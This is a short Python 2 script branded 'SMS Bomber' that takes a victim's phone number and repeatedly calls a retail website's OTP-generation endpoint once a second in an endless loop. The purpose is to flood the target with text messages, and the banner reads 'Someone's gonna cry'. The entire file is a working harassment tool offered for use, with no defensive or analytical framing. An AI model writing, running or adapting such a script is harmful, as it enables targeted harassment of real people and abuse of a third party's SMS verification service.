#!/usr/bin/env python
import os,argparse,time,urllib

if os.name == "nt":
	os_ = "		Bomber running on Windows"
	os.system('cls')					
elif os.name == "posix":
	os_ = "		Bomber running on Linux/Unix"
	os.system('clear')

def intro (self):
	global banner
	banner = """\033[95m	                     
   _____ __  __  _____   ____                  _                
  / ____|  \/  |/ ____| |  _ \                | |               
 | (___ | \  / | (___   | |_) | ___  _ __ ___ | |__   ___ _ __  
  \___ \| |\/| |\___ \  |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__| 
  ____) | |  | |____) | | |_) | (_) | | | | | | |_) |  __/ |    
 |_____/|_|  |_|_____/  |____/ \___/|_| |_| |_|_.__/ \___|_|
 Someone's gonna cry :V 
 %s                              
	\033[1;m"""%os_

def bomb (self): 
		try:		
				print banner
				parser = argparse.ArgumentParser()
				parser.add_argument('-n',
									'--number', 
									help="Phone Number to be Bombarded." , 
									required="true")	
				global eu
				eu = parser.parse_args()
				global h
				h = str(eu.number)
				count = 0
				while 1:
					count += 1 
					vic = "http://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone="+h
					urllib.urlopen(vic)
					time.sleep(1)	
					print "-----------------------------------------------------"
					print "\033[1;36m [!] Bombing Victim - %s ....... sent (%s)\033[1;m"%(h , count)
					print "-----------------------------------------------------"
		except KeyboardInterrupt :
				print "\n \033[91m [~] Stopped Bombing \033[1;m"
							
def main ():
	intro("")
	bomb("")							
if __name__ == '__main__':
			main()
